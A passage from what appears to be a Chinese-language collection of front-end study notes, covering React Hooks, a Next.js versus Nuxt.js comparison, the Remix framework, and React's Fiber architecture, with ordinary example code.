6.9. 部署和基础设施\n\n#### 6.9.1. 部署平台\n\n- Vercel（原生支持）\n- AWS\n- Google Cloud\n- Azure\n\n#### 6.9.2. Edge 运行时\n\n- Edge Functions\n- Edge Middleware\n- CDN 集成\n- 全球分发\n\n### 6.10. 开发体验\n\n#### 6.10.1. 开发服务器\n\n- 快速刷新\n- 错误处理\n- 开发时调试\n- 热模块替换（HMR）\n\n#### 6.10.2. 调试工具\n\n- React DevTools 集成\n- 性能分析\n- 内存泄漏检测\n- 网络请求监控\n\n","1HEZYffr":"\n# 为什么 React 要引入 Hooks\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- this 指向问题\n- 复杂的生命周期问题\n\t- 应该按照`关注点`而不是`时间点`来组织代码\n- 更好的逻辑复用和更好的组织代码  \n\t- 方便重构与抽离\n\t- 相关的逻辑放在一起\n- 内聚性原则\n\n## 2. 之前的问题\n\n- `this` 指向问题\n- 较多生命周期，且划分并不符合“**内聚性**”原则，\n\t- 例如 `setInterval` 和 `clearInterval` 这种具有强关联的逻辑被拆分在不同的生命周期方法中\n- 复用问题：\n\t- 数据共享或功能复用，从最早之前的 `mixin / 高阶组件` 、或者到 `Render Props`\n- 解决数据共享或功能复用\n\t- 从最早之前的 `mixin` / 高阶组件 、或者到 Render Props\n\n## 3. 类组件的问题\n\n- `类组件`中的 `this` 指向问题容易造成困扰\n- `生命周期方法`导致**相关逻辑被分散到不同方法中**\n- `复杂组件`变得难以理解和维护\n- `类组件`难以**压缩和优化**\n\n## 4. 更好的逻辑复用 和 更好的组织代码  \n\n- 在 Hooks 之前，复用状态逻辑主要`依赖 HOC（高阶组件）`和 `render props`\n\t- 这些模式需要**重构组件层级**，导致代码难以理解\n- Hooks 允许在不改变组件层级的情况下复用状态逻辑\n\t- 可以把相关的逻辑抽取到自定义 Hook 中\n\n## 5. 更容易理解的生命周期\n\n- `useEffect` 统一了生命周期的概念\n- 按照`关注点`而不是`时间点`来组织代码\n- 更直观地处理副作用\n\n","7Bsj1m0V":"\n# 对比 Next.js 与 Nuxt.js\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 生态\n\t- vue \n\t- React \n- 构建\n\t- vite  \n\t- swc turbopack\n\n## 2. 基础架构\n\n- Next.js：基于 React 生态系统\n- Nuxt.js：基于 Vue.js 生态系统\n\n这是最根本的区别，选择哪个框架往往取决于团队是更熟悉 React 还是 Vue \n\n## 3. 性能表现\n\nNext.js：\n\n- 使用 Rust 编写的 `SWC 编译器`\n- Turbopack 提供更快的构建速度\n- 默认支持流式渲染\n\nNuxt.js：\n\n- 使用 `Vite` 作为构建工具\n- Vue 3 的响应式系统提供更好的运行时性能\n- `Nitro 引擎`提供跨平台部署能力\n\n## 4. 开发体验\n\nNext.js：\n- 更严格的 TypeScript 支持\n- 更完善的 IDE 支持\n- 更大的社区和更多的第三方组件\n\nNuxt.js：\n- 更简单的学习曲线\n- 更好的约定优于配置\n- 更直观的目录结构 \n\n## 5. 特性对比\n\n|特性|Next.js|Nuxt.js|\n|---|---|---|\n|文件路由|✅|✅|\n|API 路由|✅|✅|\n|SSR|✅|✅|\n|SSG|✅|✅|\n|增量静态再生成|✅|部分支持|\n|自动代码分割|✅|✅|\n|图像优化|内置|插件支持|\n|中间件|✅|✅|\n|热模块替换|✅|✅|\n|TypeScript|原生支持|原生支持|\n\n## 6. 部署和托管\n\nNext.js：\n- Vercel 原生支持\n- 更好的 Serverless 支持\n- 更多的云平台集成\n\nNuxt.js：\n- 支持静态托管\n- Nitro 引擎支持多平台部署\n- 更灵活的服务器部署选项 \n\n## 7. 生态系统\n\nNext.js：\n- React 生态系统更大\n- 更多企业级应用案例\n- 更多第三方集成\n\nNuxt.js：\n- Vue 生态系统完善\n- 模块系统更简单\n- 更容易扩展 \n\n## 8. 适用场景\n\nNext.js 更适合：\n- 大型企业应用\n- 需要复杂状态管理的应用\n- 需要严格类型检查的项目\n- 对性能要求极高的应用\n\nNuxt.js 更适合：\n- 中小型项目\n- 快速原型开发\n- 内容驱动的网站\n- 需要简单维护的项目 \n\n## 9. 学习曲线\n\nNext.js：\n- 需要深入理解 React\n- 配置选项较多\n- 概念相对复杂\n\nNuxt.js：\n- Vue.js 的简单性\n- 更少的配置需求\n- 更直观的API \n\n## 10. 构建性能\n\nNext.js：\n- 构建时间较长\n- 产物体积较大\n- 更好的代码分割\n\nNuxt.js：\n- 更快的构建速度\n- 更小的产物体积\n- 更好的缓存策略 \n\n## 11. 社区支持\n\nNext.js：\n- Vercel 的强力支持\n- 更活跃的社区\n- 更多的学习资源\n\nNuxt.js：\n- Vue.js 官方支持\n- 稳定的更新周期\n- 完善的文档 \n\n## 12. 选择建议\n\n- 选择 Next.js 的情况：\n\t- 团队熟悉 React\n\t- 需要强大的企业级特性\n\t- 需要极致的性能优化\n\t- 项目规模较大\n- 选择 Nuxt.js 的情况：\n\t- 团队熟悉 Vue\n\t- 需要快速开发\n\t- 项目架构简单\n\t- 注重开发体验\n- 通用考虑因素：\n\t- 团队技术栈\n\t- 项目规模和复杂度\n\t- 性能需求\n\t- 开发时间限制\n\t- 维护成本\n\n两个框架都是优秀的全栈解决方案，选择哪个主要取决于具体的项目需求和团队情况。建议在选择前进行充分的技术评估和原型验证。","6UfdXYf0":"\n# Remix 框架\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 介绍 \n\n- Remix 是一个全栈 Web 框架，由 React Router 的创建者开发。\n- Remix 采用`服务器端渲染（SSR）`和`客户端（Hydration）`的方式来提供出色的用户体验\n\n## 2. 核心特性\n\n### 2.1. 全栈框架\n\n- 同时处理前端和后端逻辑\n\t- 服务器优先设计\n- 无 JS 降级支持\n- 基于 React 构建\n- 内置路由系统（基于 React Router）\n- 服务端渲染（SSR）支持\n- 智能预加载\n- 智能预加载\n- 内置的缓存策略\n\n### 2.2. 数据处理\n\n```javascript\n// 示例 1\n// Remix 数据加载示例\nexport async function loader({ params }) {\n  const user = await db.user.findUnique({\n    where: { id: params.userId }\n  });\n  return json(user);\n}\n\nexport default function UserProfile() {\n  const user = useLoaderData();\n  return <div>{user.name}</div>;\n}\n\n// 示例 2\n\n// 使用 loader 函数加载数据\nexport async function loader({ request }) {\n  const users = await db.user.findMany();\n  return json(users);\n}\n\n// 在组件中使用数据\nexport default function Users() {\n  const users = useLoaderData();\n  return (\n    <ul>\n      {users.map(user => (\n        <li key={user.id}>{user.name}</li>\n      ))}\n    </ul>\n  );\n}\n\n```\n\n## 3. 主要优势\n\n### 3.1. 嵌套路由\n\n- 支持复杂的路由结构\n- 自动代码分割\n- 并行数据加载\n\n```javascript\n// 嵌套路由示例\n// routes/dashboard.tsx\nexport default function Dashboard() {\n  return (\n    <div>\n      <h1>Dashboard</h1>\n      <Outlet /> {/* 子路由渲染位置 */}\n    </div>\n  );\n}\n\n// routes/dashboard/stats.tsx\nexport default function Stats() {\n  return <div>Statistics</div>;\n}\n```\n\n### 3.2. 渐进增强\n\n- 支持无 JavaScript 运行\n- 优秀的 SEO 表现\n- 更好的可访问性\n\n## 4. 与其他框架的比较\n\n### 4.1. 相比 Next.js\n\n- 更简单的路由系统\n- 更好的表单处理\n- 更强的渐进增强支持 \n\n### 4.2. 相比传统 SPA\n\n- 更好的性能\n- 更好的 SEO\n- 更好的用户体验 \n\n## 5. 最佳实践\n\n### 5.1. 目录结构\n\n```\napp/\n  ├── routes/\n  │   ├── index.tsx\n  │   ├── about.tsx\n  │   └── blog/\n  │       ├── index.tsx\n  │       └── $slug.tsx\n  ├── components/\n  ├── styles/\n  └── utils/\n```\n\n## 6. 最后\n\nRemix 是一个强大的全栈框架，特别适合构建需要良好性能和用户体验的现代 Web 应用。它的设计理念注重渐进增强和 Web 标准，使得开发者能够构建出更加可靠和可访问的应用程序。","QidG8cci":"\n# React 整体架构介绍\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- React 元素、React 组件、FiberNode\n\t- **职责不同**\n\t\t- React 元素：描述 UI 的==纯数据结构==\n\t\t- React 组件：封装可重用的 UI 逻辑\n\t\t- FiberNode：管理组件**更新和调度**\n\t- **可变性**\n\t\t- React 元素：不可变\n\t\t- React 组件：状态可变\n\t\t- FiberNode： 完全可变\n\t- **生命周期**\n\t\t- React 元素：无生命周期\n\t\t- React 组件：有完整生命周期\n\t\t- FiberNode：负责管理组件的生命周期\n\t- **使用场景**\n\t\t- React 元素：作为组件的==渲染结果==\n\t\t- React 组件：构建应用界面\n\t\t- FiberNode：React ==内部实现机制==\n- todo 再读一遍\n\n\n\n---\n\n> 关于 Fiber节点，更多参考 [32. React Fiber 节点的主要属性及其用途](/post/OMNtXbsz.html)\n> 前文 [6.  React 的架构设计演变](/post/jli0LDSX.html) 介绍了基本的 React 整体架构，本文继续\n\n## 2. React  元素、React 组件、FiberNode\n\n### 2.1. React 元素 (React Elements)\n\nReact 元素是描述 UI 的普通 JavaScript 对象，是最基本的构建块\n\n```javascript\n// React 元素的结构\nconst element = {\n  type: 'div',\n  props: {\n    className: 'container',\n    children: [\n      {\n        type: 'h1',\n        props: {\n          children: 'Hello'\n        }\n      }\n    ]\n  }\n}\n\n// JSX 创建 React 元素\nconst jsxElement = (\n  <div className=\"container\">\n    <h1>Hello</h1>\n  </div>\n);\n\n// React.createElement 创建元素\nconst createElement = React.createElement(\n  'div',\n  { className: 'container' },\n  React.createElement('h1', null, 'Hello')\n);\n```\n\n特点：\n1. 不可变对象（Immutable）\n2. 描述界面的==快照==\n3. 轻量级==普通对象==\n4. ==每次更新都会创建新的元素树==\n\n### 2.2. React 组件 (React Components)\n\nReact 组件是可复用的代码片段，**可以是函数组件或类组件**\n\n```javascript hl:1,6\n// 函数组件\nfunction Welcome(props) {\n  return <h1>Hello, {props.name}</h1>;\n}\n\n// 类组件\nclass Greeting extends React.Component {\n  render() {\n    return <h1>Hello, {this.props.name}</h1>;\n  }\n}\n\n// 组件的使用\nfunction App() {\n  return (\n    <div>\n      <Welcome name=\"Alice\" />\n      <Greeting name=\"Bob\" />\n    </div>\n  );\n}\n```\n\n特点：\n1. 接受 `props` 作为输入\n2. ==返回 React 元素==\n3. 可以包含`状态`和`生命周期`\n4. 可以被`多次`复用\n\n### 2.3. FiberNode\n\nFiber 节点是 `React` 内部实现的**核心数据结构**，用于**跟踪组件树的状态和变化**。\n\n```ts\n// Fiber 节点的简化结构\ninterface FiberNode {\n  // 静态数据结构\n  type: any;\n  key: null | string;\n  elementType: any;\n  stateNode: any;\n\n  // Fiber 树结构\n  return: Fiber | null;    // 父节点\n  child: Fiber | null;     // 第一个子节点\n  sibling: Fiber | null;   // 下一个兄弟节点\n\n  // 工作单元\n  pendingProps: any;\n  memoizedProps: any;\n  memoizedState: any;\n  updateQueue: UpdateQueue<any> | null;\n\n  // 副作用\n  flags: Flags;\n  subtreeFlags: Flags;\n  deletions: Array<Fiber> | null;\n\n  // 调度优先级\n  lanes: Lanes;\n  childLanes: Lanes;\n}\n\n// Fiber 节点示例\nconst fiber = {\n  type: 'div',\n  key: null,\n  stateNode: domElement,\n  \n  // 链接到其他 Fiber 节点\n  return: parentFiber,\n  child: childFiber,\n  sibling: null,\n\n  // 状态相关\n  memoizedState: null,\n  memoizedProps: { className: 'container' },\n  \n  // 副作用标记\n  flags: Update,\n};\n```\n\n特点：\n1. 构成了**可中断的工作单元（动态工作单元）**\n2. 包含了完整的组件信息，每个 FiberNode 对应一个 React 元素，包括这个 React 对应的所有`静态数据结构`\n3. 形成了`链表`结构\n4. 支持优先级调度\n\n### 2.4. 三者的关系与区别\n\n#### 2.4.1. 数据结构对比\n\n```javascript\n// React 元素 - 普通对象\nconst element = {\n  type: 'div',\n  props: { className: 'example' }\n};\n\n// React 组件 - 函数或类\nfunction Component(props) {\n  return <div className=\"example\" />;\n}\n\n// FiberNode - 复杂数据结构\nconst fiber = {\n  type: Component,\n  memoizedState: null,\n  memoizedProps: {},\n  // ... 更多 Fiber 相关属性\n};\n```\n\n#### 2.4.2. 生命周期和更新机制\n\n```jsx\n// React 元素 - 不可变\nconst element1 = <div>Hello</div>;\nconst element2 = <div>Hello</div>; // 完全新的对象\n\n// React 组件 - 可维护状态\nclass StatefulComponent extends React.Component {\n  state = { count: 0 };\n  \n  componentDidMount() {\n    // 生命周期方法\n  }\n  \n  render() {\n    return <div>{this.state.count}</div>;\n  }\n}\n\n// FiberNode - 跟踪更新\nfunction processUpdateQueue(fiber) {\n  const queue = fiber.updateQueue;\n  // 处理更新队列\n  // 设置新的状态\n  fiber.memoizedState = newState;\n}\n```\n\n#### 2.4.3. 用途对比\n\n```jsx\n// 1. React 元素 - UI 描述\nconst buttonElement = (\n  <button className=\"btn\">\n    Click me\n  </button>\n);\n\n// 2. React 组件 - 逻辑封装\nfunction Button({ onClick, children }) {\n  const [isPressed, setIsPressed] = useState(false);\n  \n  return (\n    <button\n      className={`btn ${isPressed ? 'pressed' : ''}`}\n      onClick={onClick}\n    >\n      {children}\n    </button>\n  );\n}\n\n// 3. FiberNode - 内部调度\nclass FiberScheduler {\n  workLoop(deadline) {\n    let shouldYield = false;\n    while (nextUnitOfWork && !shouldYield) {\n      nextUnitOfWork = performUnitOfWork(nextUnitOfWork);\n      shouldYield = deadline.timeRemaining() < 1;\n    }\n    requestIdleCallback(workLoop);\n  }\n}\n```\n\n### 2.5. 主要区别\n\n- **职责不同**\n\t- React 元素：描述 UI 的纯数据结构\n\t- React 组件：封装可重用的 UI 逻辑\n\t- FiberNode：管理组件**更新和调度**\n- **可变性**\n\t- React 元素：不可变\n\t- React 组件：状态可变\n\t- FiberNode： 完全可变\n- **生命周期**\n\t- React 元素：无生命周期\n\t- React 组件：有完整生命周期\n\t- FiberNode：负责管理组件的生命周期\n- **使用场景**\n\t- React 元素：作为组件的渲染结果\n\t- React 组件：构建应用界面\n\t- FiberNode：React 内部实现机制\n\n## 3. 完整的 FiberNode 节点\n\n```javascript hl:7,14,22,37,41\nfunction FiberNode(\n  tag: WorkTag,\n  pendingProps: mixed,\n  key: null | string,\n  mode: TypeOfMode,\n) {\n  // 作为静态数据结构的属性\n  this.tag = tag;\n  this.key = key;\n  this.elementType = null;\n  this.type = null;\n  this.stateNode = null;\n\n  // 用于连接其他 Fiber 节点形成 Fiber树\n  this.return = null;\n  this.child = null;\n  this.sibling = null;\n  this.index = 0;\n\n  this.ref = null;\n\n  // 作为动态的工作单元的属性\n  this.pendingProps = pendingProps;\n  this.memoizedProps = null;\n  this.updateQueue = null;\n  this.memoizedState = null;\n  this.dependencies = null;\n\n  this.mode = mode;\n\n  this.effectTag = NoEffect;\n  this.nextEffect = null;\n\n  this.firstEffect = null;\n  this.lastEffect = null;\n\n  // 调度优先级相关\n  this.lanes = NoLanes;\n  this.childLanes = NoLanes;\n\n  // 指向该 fiber 在另一次更新时对应的fiber\n  this.alternate = null;\n}\n\n```\n\n## 4. 两棵 Fiber 树：双缓存机制\n\n- 真实 UI 对应的 Fiber Tree：\n\t- ==前缓冲区==、即`浏览器上显示的 UI`\n\t\t- workInProgress Fiber 树\n\t\t- 使用 current 指针 指向它\n- 正在内存中构建 Fiber Tree：==后缓冲区==\n\t- workInProgress Fiber 树\n\n### 4.1. 举个示例：mount 一个组件时\n\n![图片&文件](./files/20241029-3.png)\n\n### 4.2. 举个示例：点击 p 节点，update 一个组件时\n\n![图片&文件](./files/20241029-4.png)\n\n## 5. 为什么需要 Fiber\n\n在旧的架构中，React 的更新过程是同步的，称为 `Stack Reconciler`。这可能导致以下问题：\n- ==当组件树很大时，更新过程会占用主线程太长时间==\n- 无法中断更新过程\n- 可能导致掉帧和页面卡顿\nFiber 是 React 16 引入的新架构，其核心目标是实现：\n- **增量渲染**：\n\t- 能够将渲染工作分片，并将其分散到==多个帧==中\n- **任务暂停和恢复**：\n\t- 能够暂停正在进行的工作，稍后再恢复\n- **任务优先级**：\n\t- 能够为不同的更新分配优先级\n- **并发模式**：\n\t- 支持并发更新\n\n## 6. Fiber 节点的基本结构\n\n```javascript hl:7,14,22,37,41\nfunction FiberNode(\n  tag: WorkTag,\n  pendingProps: mixed,\n  key: null | string,\n  mode: TypeOfMode,\n) {\n  // 作为静态数据结构的属性\n  this.tag = tag;\n  this.key = key;\n  this.elementType = null;\n  this.type = null;\n  this.stateNode = null;\n\n  // 用于连接其他 Fiber节点 形成Fiber树\n  this.return = null;\n  this.child = null;\n  this.sibling = null;\n  this.index = 0;\n\n  this.ref = null;\n\n  // 作为动态的工作单元的属性\n  this.pendingProps = pendingProps; // 正在等待处理的新props\n  this.memoizedProps = null;    // 上一次渲染时的props\n  this.updateQueue = null;     //  一个队列，包含了该Fiber上的状态更新和副作用\n  this.memoizedState = null;   // 上一次渲染时的 state\n  this.dependencies = null;    // 该 Fiber 订阅的上下文或其他资源的描述\n\n  this.mode = mode;\n\n  // 副作用：effects\n  this.effectTag = NoEffect;\n   this.flags = NoFlags; // 描述该Fiber发生的副作用的标志（十六进制的标识）\n   this.subtreeFlags = NoFlags; // 描述该Fiber子树中发生的副作用的标志（十六进制的标识） \n   this.deletions = null; // 在commit阶段要删除的子Fiber数组\n  this.nextEffect = null;\n  \n\n  this.firstEffect = null;\n  this.lastEffect = null;\n\n  // 调度优先级相关\n  this.lanes = NoLanes;\n  this.childLanes = NoLanes;\n\n  // 指向该fiber在另一次更新时对应的fiber\n  this.alternate = null;\n}\n\n\n```\n\n- **单元工作**：\n\t- 每个Fiber节点代表一个`工作单元`，所有Fiber节点共同组成一个Fiber链表树（有链接属性，同时又有树的结构）\n\t- 这种结构让React可以==细粒度控制节点的行为==。\n- **指针属性**：\n\t- **`child`**、**`sibling`** 和 **`return`** 字段构成了Fiber之间的链接关系\n\t- 使React能够遍历组件树并知道从哪里开始、继续或停止工作。\n- **双缓冲技术**\n- **State 和 Props**：\n\t- `memoizedProps`、**`pendingProps`** 和 **`memoizedState`** 字段\n\t\t- 让 React 知道组件的==上一个状态和即将应用的状态==\n\t- 通过比较这些值，React 可以决定组件是否需要更新，从而避免不必要的渲染，提高性能\n- **副作用的追踪**：\n\t- `flags` 和 **`subtreeFlags`** 字段标识 Fiber 及其子树中需要执行的副作用\n\t- 例如 DOM 更新、生命周期方法调用等。\n\t- ==React 会积累这些副作用，然后在 Commit 阶段一次性执行，从而提高效率。==\n\n## 7. 协调阶段（Reconciler）：Render 阶段\n\n协调阶段（Reconciler）：\n- 构建 Fiber 树：\n\t-  workInProgress tree\n- Diff 算法\n- **收集副作用**：\n\t- 生成 `effects list`\n- **目标**: \n\t- 确定哪些部分的UI需要更新\n- **原理**:\n\t-  这是React构建`工作进度树`的阶段，会比较新的 props 和 旧的Fiber树来确定哪些部分需要更新\n\n### 7.1. `react-reconciler`包\n\n此处先归纳一下`react-reconciler`包的主要作用, 将主要功能分为 4 个方面:\n1. 输入: 暴露`api`函数(如: `scheduleUpdateOnFiber`), 供给其他包(如`react`包)调用.\n2. 注册调度任务: 与调度中心(`scheduler`包)交互, 注册调度任务`task`, 等待任务回调.\n3. 执行任务回调: 在内存中构造出`fiber树`, 同时与与渲染器(`react-dom`)交互, 在内存中创建出与`fiber`对应的`DOM`节点.\n4. 输出: 与渲染器(`react-dom`)交互, 渲染`DOM`节点.\n\n![图片&文件](./files/20241031-19.png)\n\n### 7.2. `Fiber节点`是如何被创建并构建`Fiber 树`的呢？\n\n`render阶段`开始于`performSyncWorkOnRoot`或`performConcurrentWorkOnRoot`方法的调用，这取决于本次更新是同步更新还是异步更新\n\n- workInProgress\n- performUnitOfWork\n\n```javascript\n//① performSyncWorkOnRoot 会调用该方法\nfunction workLoopSync() {\n  while (workInProgress !== null) {\n    performUnitOfWork(workInProgress);\n  }\n}\n\n//②  performConcurrentWorkOnRoot 会调用该方法\nfunction workLoopConcurrent() {\n  while (workInProgress !== null && !shouldYield()) {\n    performUnitOfWork(workInProgress);\n  }\n}\n\n// ③ performUnitOfWork 方法\n// 会创建下一个Fiber节点并赋值给 workInProgress\n// 并将 workInProgress 与 已创建的Fiber节点连接起来构成 Fiber树\nfunction performUnitOfWork(fiber) {\n  // 1. 处理当前 fiber 节点\n  const next = beginWork(fiber);\n  fiber.memoizedProps = fiber.pendingProps;\n\n  if (next === null) {\n    // 2. 没有子节点，完成当前节点\n    completeUnitOfWork(fiber);\n  }\n  return next;\n}\n\n```\n\n### 7.3. 举个示例\n\n```tsx\nfunction App() {\n  return (\n    <div>\n      i am\n      <span>KaSong</span>\n    </div>\n  );\n}\n\nReactDOM.render(<App />, document.getElementById(\"root\"));\n\n```\n\n对应的 `Fiber 树` 如下：\n\n![图片&文件](./files/20241031-18.png)\n\n然后就是`DFS 递归遍历`这个树了\n- 如果是==进入==节点，执行 `beginWork`\n- 如果是==离开==节点，执行 `completeWork`\n\n所以，下面打印出遍历这些节点的顺序\n\n```bash\n1. rootFiber beginWork\n2. App Fiber beginWork\n3. div Fiber beginWork\n4. \"i am\" Fiber beginWork\n5. \"i am\" Fiber completeWork\n6. span Fiber beginWork\n7. span Fiber completeWork\n8. div Fiber completeWork\n9. App Fiber completeWork\n10. rootFiber completeWork\n```\n\n### 7.4. beginWork：创建与标记更新节点\n\n- 判断`Fiber节点`是否要更新\n- 判断`Fiber子节点`是更新还是复用\n\n### 7.5. completeWork：收集副作用列表\n\n主要完成收集副作用列表：\n- 记录`Fiber`的副作用标志\n- 为`子Fiber`创建链表\n\n## 8. 渲染阶段（Renderer） ：commit 阶段\n\n- Render 阶段可能被打断，但 `commit` 不能\n- 目标：更新DOM并**执行副作用** \n- 遍历在`Reconciliation阶段（render 阶段）`创建的副作用列表进行更新\n\n```javascript hl:2,5,8\nfunction commitRoot(root: FiberRoot) {\n  // 1. 执行前置操作：执行`DOM`操作前）\n  commitBeforeMutationEffects(root);\n  \n  // 2. 执行 DOM 操作：（执行`DOM`操作）\n  commitMutationEffects(root);\n  \n  // 3. 执行布局副作用：执行`DOM`操作后\n  commitLayoutEffects(root);\n}\n\n```\n\n- `before mutation 阶段`，会遍历`effectList`，依次执行：\n\t- 处理`DOM节点`渲染/删除后的 `autoFocus`、`blur`逻辑\n\t- 调用`getSnapshotBeforeUpdate`生命周期钩子\n\t- 调度`useEffect`\n- `mutation阶段`会遍历`effectList`，依次执行`commitMutationEffects`。\n\t- 该方法的主要工作为“根据`effectTag`调用不同的处理函数处理`Fiber`\n- `layout阶段`会遍历`effectList`\n\t- 根据`effectTag`调用不同的处理函数处理`Fiber`并更新`ref`\n\n> 是的，三个阶段都会遍历一遍 `effectList` \n\n## 9. 调度模块（Scheduler）\n\nScheduler（调度器）是 React 的核心模块，主要负责：\n- 任务优先级管理\n- 时间片分配\n- 可中断渲染\n\n![图片&文件](./files/20241031-25.png)\n\n### 9.1. 调度中心的核心实现\n\n1. **任务创建**：通过 `scheduleCallback` 创建任务\n2. **优先级分配**：根据任务类型分配优先级\n3. **入队排序**：放入对应优先级队列\n4. **任务调度**：循环执行任务，支持中断\n5. **时间切片**：控制执行时间，避免阻塞\n\n![图片&文件](./files/20241031-20.png)\n\n### 9.2. 时间切片的实现\n\n- MessageChannel 实现：`new MessageChannel();`\n\n","OMNtXbsz":"\n# React Fiber 节点的主要属性及其用途\n\n`#React` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- 再读一遍\n- todo\n\n## 1. 篇一\n\n### 1.1. 节点标识和类型相关\n\n```typescript\ninterface FiberNode {\n  // 标记 Fiber 节点的类型\n  tag: WorkTag;  // 例如：FunctionComponent = 0, ClassComponent = 1, HostComponent = 5 等\n\n  // 元素的唯一标识\n  key: null | string;\n  \n  // 元素的类型，对应 React Element 的 type\n  // 可能是函数、类或原生 DOM 类型（如 'div'）\n  elementType: any;\n  \n  // 实际使用的类型，考虑了 elementType 可能被 resolve 的情况\n  type: any;\n\n  // 对于原生 DOM 节点，保存实际 DOM 节点的引用\n  // 对于组件，保存组件实例\n  stateNode: any;\n}\n```\n\n### 1.2. Fiber 树结构相关\n\n>  树结构相关，比如 return 代表父级节点\n\n\n```typescript\ninterface FiberNode {\n  // 指向父级 Fiber 节点\n  return: Fiber | null;\n  \n  // 指向第一个子 Fiber 节点\n  child: Fiber | null;\n  \n  // 指向下一个兄弟 Fiber 节点\n  sibling: Fiber | null;\n  \n  // 索引号，用于处理数组类型的子节点\n  index: number;\n\n  // 指向旧树中对应的 Fiber 节点\n  alternate: Fiber | null;\n}\n```\n\n### 1.3. 状态和副作用相关\n\n```typescript\ninterface FiberNode {\n  // setState\n  // 待更新队列，存储 setState 的更新\n  updateQueue: UpdateQueue<any> | null;\n  \n  // 当前的状态\n  memoizedState: any;\n  \n  // 待处理的 props\n  pendingProps: any;\n  \n  // 已经处理完的 props\n  memoizedProps: any;\n\n  // 副作用标记，表示节点需要执行的操作\n  // 如：Placement、Update、Deletion 等\n  flags: Flags;\n  \n  // 子树中的副作用标记\n  subtreeFlags: Flags;\n  \n  // 指向下一个有副作用的 Fiber 节点\n  nextEffect: Fiber | null;\n  \n  // 副作用链表的第一个和最后一个节点\n  firstEffect: Fiber | null;\n  lastEffect: Fiber | null;\n}\n```\n\n### 1.4. 优先级相关\n\n```typescript\ninterface FiberNode {\n  // 任务的优先级\n  lanes: Lanes;\n  \n  // 子树的优先级\n  childLanes: Lanes;\n  \n  // 替代树的优先级\n  alternateLanes: Lanes;\n}\n```\n\n### 1.5. 工作进度相关\n\n```typescript\ninterface FiberNode {\n  // 记录已经处理到的 Hook 位置\n  nextHook: Hook | null;\n  \n  // 工作进行到的时间\n  expirationTime: ExpirationTime;\n}\n```\n\n### 1.6. 主要属性的使用场景\n\n#### 1.6.1. 节点更新流程\n\n```javascript\nfunction updateFiberNode(fiber: FiberNode) {\n  // 1. 检查更新优先级\n  if (fiber.lanes === NoLanes) {\n    return;\n  }\n\n  // 2. 处理 props 更新\n  if (fiber.pendingProps !== fiber.memoizedProps) {\n    // 需要更新\n    fiber.flags |= Update;\n  }\n\n  // 3. 处理状态更新\n  const updateQueue = fiber.updateQueue;\n  if (updateQueue !== null) {\n    processUpdateQueue(fiber, updateQueue);\n  }\n\n  // 4. 处理副作用\n  if (fiber.flags !== NoFlags) {\n    // 将当前节点加入副作用链表\n    scheduleCallback(fiber);\n  }\n}\n```\n\n#### 1.6.2. Fiber 树的遍历\n\n```javascript\nfunction traverseFiber(fiber: FiberNode) {\n  let nextFiber = fiber;\n\n  while (nextFiber !== null) {\n    // 1. 处理当前节点\n    processNode(nextFiber);\n\n    // 2. 深度优先遍历\n    if (nextFiber.child) {\n      nextFiber = nextFiber.child;\n      continue;\n    }\n\n    // 3. 没有子节点，处理兄弟节点\n    while (nextFiber.sibling === null) {\n      if (nextFiber.return === null || nextFiber.return === fiber) {\n        return;\n      }\n      nextFiber = nextFiber.return;\n    }\n    nextFiber = nextFiber.sibling;\n  }\n}\n```\n\n#### 1.6.3. 状态更新示例\n\n```javascript\nfunction updateState(fiber: FiberNode, update: Update) {\n  // 1. 创建或获取更新队列\n  const updateQueue = fiber.updateQueue || createUpdateQueue();\n  \n  // 2. 将更新添加到队列\n  enqueueUpdate(updateQueue, update);\n  \n  // 3. 标记需要更新\n  fiber.flags |= Update;\n  \n  // 4. 设置更新优先级\n  const lane = requestUpdateLane();\n  fiber.lanes |= lane;\n  \n  // 5. 向上标记父节点的 childLanes\n  let parent = fiber.return;\n  while (parent !== null) {\n    parent.childLanes |= lane;\n    parent = parent.return;\n  }\n}\n```\n\n#### 1.6.4. 副作用处理\n\n```javascript\nfunction commitWork(fiber: FiberNode) {\n  // 1. 检查副作用标记\n  if (fiber.flags & Placement) {\n    // 处理节点插入\n    commitPlacement(fiber);\n  }\n  \n  if (fiber.flags & Update) {\n    // 处理节点更新\n    commitUpdate(fiber);\n  }\n  \n  if (fiber.flags & Deletion) {\n    // 处理节点删除\n    commitDeletion(fiber);\n  }\n\n  // 2. 处理生命周期和 hooks 的副作用\n  if (fiber.flags & PassiveEffect) {\n    schedulePassiveEffects(fiber);\n  }\n}\n```\n\n#### 1.6.5. 优先级调度\n\n```javascript\nfunction scheduleFiberWork(fiber: FiberNode, lane: Lane) {\n  // 1. 设置当前工作的优先级\n  fiber.lanes |= lane;\n  \n  // 2. 向上传播优先级\n  let parent = fiber.return;\n  while (parent !== null) {\n    parent.childLanes |= lane;\n    parent = parent.return;\n  }\n  \n  // 3. 根据优先级调度工作\n  scheduleCallback(\n    getCurrentPriorityLevel(),\n    performConcurrentWorkOnRoot.bind(null, root)\n  );\n}\n```\n\n### 1.7. 注意事项\n\n1. **内存管理**\n   - 及时清理不需要的 Fiber 节点\n   - 重用 alternate 节点以减少内存分配\n\n2. **优先级处理**\n   - 正确设置和传播优先级\n   - 考虑任务中断和恢复\n\n3. **副作用管理**\n   - 合理使用 flags 标记\n   - 维护好副作用链表\n\n4. **状态一致性**\n   - 确保 memoizedState 和 memoizedProps 的正确性\n   - 处理好 updateQueue 的更新顺序\n\n## 2. 篇二\n\n### 2.1. 节点标识和类型属性\n\n```javascript\nclass FiberNode {\n  tag: WorkTag;           // 标识节点类型（函数组件、类组件、原生组件等）\n  key: null | string;     // React元素的key属性\n  elementType: any;       // 元素类型\n  type: any;             // 对于函数组件，是函数本身；对于类组件，是类\n  stateNode: any;        // 指向实际DOM节点或组件实例\n}\n```\n\n这些属性用于标识和存储 Fiber 节点的基本信息，帮助 React 识别和管理不同类型的组件\n\n### 2.2. Fiber ==树结构==相关属性\n\n```javascript\nclass FiberNode {\n  return: Fiber | null;    // 指向父 Fiber 节点\n  child: Fiber | null;     // 指向第一个子 Fiber 节点\n  sibling: Fiber | null;   // 指向下一个兄弟 Fiber 节点\n  index: number;           // 在兄弟节点中的索引\n  ref: any;               // ref 属性\n}\n```\n\n这些属性构建了 Fiber 